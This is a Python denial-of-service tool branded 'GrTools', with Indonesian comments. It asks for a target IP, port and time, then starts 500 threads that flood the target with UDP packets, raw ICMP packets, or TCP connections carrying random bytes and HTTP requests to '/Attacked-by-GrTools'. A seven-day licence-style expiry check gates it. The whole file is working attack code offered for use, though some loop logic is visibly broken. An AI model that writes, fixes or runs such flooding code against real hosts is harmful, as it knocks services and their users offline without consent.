import socket
import random
import datetime
import threading
import os
import time

error = 'Error Cant Connecting | ip : {ip} port : {port}'

# Tanggal kedaluwarsa (misalnya 7 hari setelah saat ini)
expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)

# Fungsi untuk memeriksa apakah akun sudah kedaluwarsa
def is_account_expired():
    current_date = datetime.datetime.now()
    if current_date > expiration_date:
        return True
    else:
        return False

# Memeriksa apakah akun sudah kedaluwarsa sebelum menjalankan aksi
if is_account_expired():
    print("Akun telah kedaluwarsa. Silakan perbarui.")
    # Tambahkan kode untuk menampilkan pesan atau melakukan tindakan lain saat akun telah kedaluwarsa
    exit()


tampilan = """
╔═══╦═══╗    ╔════╦═══╦═══╦╗──╔═══╗
║╔═╗║╔═╗║    ║╔╗╔╗║╔═╗║╔═╗║║──║╔═╗║
║║─╚╣╚═╝║    ╚╝║║╚╣║─║║║─║║║──║╚══╗
║║╔═╣╔╗╔╝      ║║─║║─║║║─║║║─╔╬══╗║
║╚╩═║║║╚╗      ║║─║╚═╝║╚═╝║╚═╝║╚═╝║
╚═══╩╝╚═╝      ╚╝─╚═══╩═══╩═══╩═══╝
"""
print(tampilan)

ip = str(input("GRC2@root~# Enter Target IP : "))
ip = socket.gethostbyname(ip)
port = int(input("GRC2@root~# Enter Target PORT : "))
times = int(input("GRC2@root~# Enter TIME : "))

print("""
    ┌────────────────────────────────────┐
    │          GrTools Methods           │            
    │  [+] TCP                           │           
    │  [+] UDP                           │                                                                                                   
    └────────────────────────────────────┘
   ┌───────────────────────────────────────┐
       Copyright  GrTools Plan Lifetime       
   └───────────────────────────────────────┘
""")

method = str(input("GRC2@root~# Enter METHOD : "))
if method == "UDP" or method == "CPUKILL" or method == "TCP":
    print("VALID METHOD")
else:
    print("METHOD INVALID!")
    time.sleep(200000)
    time.sleep(2000)

# Nih headers buat method biar tambah seterong aja :p
def Headers(method):
    header = ""
    if method == "TCP" or method == "UDP" or method == "TLS" or method == "CPUKILL":
        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        forward = "X-Forwarded-For: 1\r\n"
        forward += "Client-IP: 10000\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        header = post_host + forward + content + connection +  length + "\r\n\r\n"
    return header

def udpby():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, port))

    udpfloodl = os.urandom(10024)
    while datetime.datetime.now() < expiration_date:
        get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers(method) + "\r\n"  # Memanggil fungsi Headers dengan memberikan argumen method
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers(method) + "\r\n"  # Memanggil fungsi Headers dengan memberikan argumen method
        try:
            s.sendto(udpfloodl, (ip, port))
            for x in range(times):
                s.sendto(udpfloodl, (ip, port))
                print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method UDP Flood ")
        except socket.error:
            print(f"Error Cant Connecting | ip : {ip} port : {port}")
            s.close()

def cpukil():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.connect((ip, port))
    cpu = os.urandom(10024)
    while datetime.datetime.now() < expiration_date:
        try:
            s.sendto(cpu, (ip, port))
            for x in range(times):
                    s.sendto(cpu, (ip, port))
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method {method} ")
        except socket.error:
            print(error)
            s.close()

def tcpfl():
    grtools = os.urandom(15419) + random._urandom(10414)
    while datetime.datetime.now() < expiration_date:
        get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers(method) + "\r\n"  # Memanggil fungsi Headers dengan memberikan argumen method
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers(method) + "\r\n"  # Memanggil fungsi Headers dengan memberikan argumen method
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(grtools)
            sock.sendall(str.encode(request))
            sock.sendall(str.encode(request))
            for x in range(times):
                    sock.sendall(str.encode(request))
                    sock.sendall(str.encode(request))
                    sock.send(grtools)
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method TCP Flood ")
        except socket.error:
                print(error)
                sock.close()


for x in range(500):
    if method == "TCP":
            t = threading.Thread(target=tcpfl)
            t.start()
    elif method == "CPUKILL":
            t = threading.Thread(target=cpukil)
            t.start()
    elif method == "UDP":
            t = threading.Thread(target=udpby)
            t.start()
